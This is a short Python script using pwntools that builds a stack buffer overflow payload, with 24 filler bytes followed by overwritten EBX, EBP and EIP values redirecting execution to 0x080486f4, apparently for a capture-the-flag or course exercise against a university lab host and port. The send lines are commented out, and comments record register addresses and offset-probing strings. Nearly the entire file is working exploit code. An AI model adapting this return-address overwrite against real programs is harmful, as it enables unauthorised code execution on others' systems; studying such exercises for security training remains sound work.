# EBP 0xffffcec8 41 42 43 44
#EBX 0xffffcec4 -> 0x0804a000 37 38 39 40
# 45 46 47 48 EIP


#ebx at 0xffffce40
#ebp at 0xffffcdd8
#eip at 0x080486f4

from pwn import *
import sys

host ='mustard.stt.rnl.tecnico.ulisboa.pt'
port = '9994'

ebx = 0xffffce40
ebp = 0xaaaaaaaa
eip = 0x080486f4

elf = ELF('./bin')

s = b'A' * 24 + p32(ebx) + p32(ebp) + p32(eip) 


#p = remote(host, port)

raw_input()

#p.sendline(s)
#p.interactive()

#AAAAAAAAAAAAAAAAbbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkkllllmm
#AAAAAAAAAAAAAAAAbbbbccccddddeeee080486f4